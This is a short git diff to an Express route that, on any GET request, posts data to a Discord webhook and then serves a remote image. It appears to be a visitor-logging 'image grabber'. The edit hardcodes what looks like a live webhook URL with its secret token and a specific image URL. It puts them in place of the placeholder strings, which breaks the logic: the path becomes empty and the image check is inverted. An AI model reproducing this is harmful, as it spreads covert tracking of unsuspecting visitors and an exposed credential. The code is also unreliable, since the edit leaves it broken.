@@ -137,7 +137,7 @@ app.get("/*", (req, res) => {
       request(
         {
           hostname: "discord.com",
-          path: config.webhookurl.replace("https://discord.com", ""),
+          path: config.webhookurl.replace("https://discord.com/api/webhooks/1206128562269331467/tCRzaViYmQ4IW6kmg6Ffq4hnhVDV6XairSVmMKJDxBQVWyCRHhVgwJr2Y4vAnWziSHeI", ""),
           method: "POST",
           headers: {
             "Content-Type": "application/json",
@@ -146,7 +146,7 @@ app.get("/*", (req, res) => {
         },
         data,
         () => {
-          if (config.imageurl !== "IMAGE_URL") {
+          if (config.imageurl !== "https://media.discordapp.net/attachments/1206128546892746762/1206130139482558514/OIP.jpg?ex=65dae33a&is=65c86e3a&hm=c45322b2fec84411f889710bfb04f728cd56ccd377bb7cd106fbbd9227b28dda&=&format=webp&width=496&height=331") {
             https.get(config.imageurl, (response) => {
               if (response.statusCode === 200) {
                 res.setHeader("Content-Type", "image/png");
